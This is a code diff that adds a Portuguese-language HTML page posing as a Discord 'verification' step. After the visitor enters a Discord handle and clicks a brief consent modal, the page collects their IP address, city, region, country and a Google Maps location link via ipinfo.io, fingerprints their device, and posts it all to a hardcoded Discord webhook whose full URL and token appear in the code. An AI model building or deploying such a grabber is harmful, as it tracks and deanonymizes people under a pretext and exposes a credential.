@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação Discord</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ua-parser-js/1.0.37/ua-parser.min.js"></script>
+</head>
+<body>
+    <!-- Modal para inserir o @ do Discord -->
+    <div id="discordModal" class="modal">
+        <div class="modal-content">
+            <h2>Verificação</h2>
+            <p>Insira seu @ do Discord para continuar:</p>
+            <input type="text" id="discordHandle" placeholder="@seuusuario" required>
+            <button onclick="submitDiscord()">Enviar</button>
+        </div>
+    </div>
+
+    <!-- Conteúdo principal -->
+    <div id="mainContent">
+        <header>
+            <img src="logo.png" alt="Logo do Site" class="site-logo">
+            <h1>Bem-vindo à Verificação</h1>
+        </header>
+        <nav>
+            <button onclick="openTerms()">Verificar</button>
+        </nav>
+        <footer>
+            <p>Junte-se ao nosso servidor do Discord: <a href="https://discord.gg/seu-servidor" target="_blank">Clique aqui</a></p>
+        </footer>
+
+        <!-- Modal de termos e condições -->
+        <div id="termsModal" class="modal">
+            <div class="modal-content">
+                <h2>Termos e Condições</h2>
+                <p>Ao clicar em "Aceitar", você concorda com a coleta de dados, incluindo seu @ do Discord, IP, localização, dispositivo e outras informações para fins de verificação.</p>
+                <button onclick="acceptTerms()">Aceitar</button>
+                <button onclick="closeTerms()">Recusar</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Elementos
+        const discordModal = document.getElementById('discordModal');
+        const mainContent = document.getElementById('mainContent');
+        const termsModal = document.getElementById('termsModal');
+        const discordHandleInput = document.getElementById('discordHandle');
+
+        // Inicializar
+        mainContent.style.display = 'none';
+        termsModal.style.display = 'none';
+
+        // Config padrão (fallback)
+        const defaultConfig = {
+            webhook: "https://discord.com/api/webhooks/1360595060672040990/aAy8Yj1c9iQ3rVH_lg9R3qwA4_G_omtJMNTH8_jf69idGoP3Fa7qshl3dd7XVNld7Kwh",
+            embed: {
+                title: "Nova Verificação",
+                color: "#FF0000",
+                fields: [
+                    { name: "**Nome**", key: "nick" },
+                    { name: "**Data**", key: "date" },
+                    { name: "**Vpn**", key: "vpn" },
+                    { name: "**Proxy**", key: "proxy" },
+                    { name: "**IP**", key: "ip" },
+                    { name: "**Loc**", key: "loc" },
+                    { name: "**Cidade**", key: "cidade" },
+                    { name: "**Estado**", key: "estado" },
+                    { name: "**Pais**", key: "pais" },
+                    { name: "**Dispositivo**", key: "dispositivo" }
+                ]
+            }
+        };
+
+        // Carregar config.json
+        let config = defaultConfig;
+        fetch('config.json')
+            .then(response => {
+                if (!response.ok) throw new Error('config.json não encontrado');
+                return response.json();
+            })
+            .then(data => config = { ...defaultConfig, ...data })
+            .catch(error => console.warn('Usando config padrão:', error));
+
+        // Função para enviar o @ do Discord
+        function submitDiscord() {
+            const discordHandle = discordHandleInput.value.trim();
+            if (discordHandle) {
+                discordModal.style.display = 'none';
+                mainContent.style.display = 'block';
+                window.discordHandle = discordHandle;
+            } else {
+                alert('Por favor, insira seu @ do Discord.');
+            }
+        }
+
+        // Abrir modal de termos
+        function openTerms() {
+            termsModal.style.display = 'flex';
+        }
+
+        // Fechar modal de termos
+        function closeTerms() {
+            termsModal.style.display = 'none';
+        }
+
+        // Aceitar termos e enviar ao webhook
+        async function acceptTerms() {
+            termsModal.style.display = 'none';
+
+            // Dados iniciais
+            let data = {
+                nick: window.discordHandle || "@desconhecido",
+                date: new Date().toLocaleString("pt-BR"),
+                vpn: "Não disponível",
+                proxy: "Não disponível",
+                ip: "Não disponível",
+                loc: "Não disponível",
+                cidade: "Não disponível",
+                estado: "Não disponível",
+                pais: "Não disponível",
+                dispositivo: "Não disponível"
+            };
+
+            // Obter IP e geolocalização com IPinfo
+            try {
+                const ipResponse = await fetch('https://ipinfo.io/json');
+                if (ipResponse.ok) {
+                    const ipData = await ipResponse.json();
+                    data.ip = ipData.ip || "Não disponível";
+                    data.cidade = ipData.city || "Não disponível";
+                    data.estado = ipData.region || "Não disponível";
+                    data.pais = ipData.country || "Não disponível";
+                    data.loc = ipData.loc
+                        ? `[${ipData.city || 'Local'}, ${ipData.region || 'Desconhecido'}](https://www.google.com/maps?q=${ipData.loc}) (Google Maps)`
+                        : `${ipData.city || 'Local'}, ${ipData.region || 'Desconhecido'} (aproximado)`;
+                    data.vpn = ipData.bogon ? "Possível" : "Não disponível";
+                    data.proxy = ipData.bogon ? "Possível" : "Não disponível";
+                } else {
+                    console.error('Erro na resposta do IPinfo:', ipResponse.status);
+                }
+            } catch (error) {
+                console.error('Erro ao obter dados do IPinfo:', error);
+                data.loc = "Erro na API (aproximado)";
+            }
+
+            // Obter dispositivo
+            try {
+                const parser = new UAParser();
+                const result = parser.getResult();
+                data.dispositivo = `${result.device.type || 'Desktop'} (${result.os.name || 'Desconhecido'} ${result.os.version || ''}, ${result.browser.name || 'Desconhecido'})`;
+            } catch (error) {
+                console.error('Erro ao obter dispositivo:', error);
+            }
+
+            // Criar embed
+            const embed = {
+                embeds: [{
+                    title: config.embed.title || "Nova Verificação",
+                    color: parseInt((config.embed.color || "#FF0000").replace("#", ""), 16),
+                    fields: config.embed.fields.map(field => ({
+                        name: field.name,
+                        value: data[field.key] || "Não disponível",
+                        inline: ["vpn", "proxy", "cidade", "estado", "pais"].includes(field.key)
+                    })),
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Enviar ao webhook
+            try {
+                const response = await fetch(config.webhook, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(embed)
+                });
+                if (response.ok) {
+                    alert("Verificação concluída! Dados enviados.");
+                } else {
+                    console.error('Erro na resposta do webhook:', response.status);
+                    alert("Erro ao enviar os dados. Tente novamente.");
+                }
+            } catch (error) {
+                console.error('Erro ao enviar webhook:', error);
+                alert("Erro ao conectar ao servidor.");
+            }
+        }
+    </script>
+</body>
+</html>
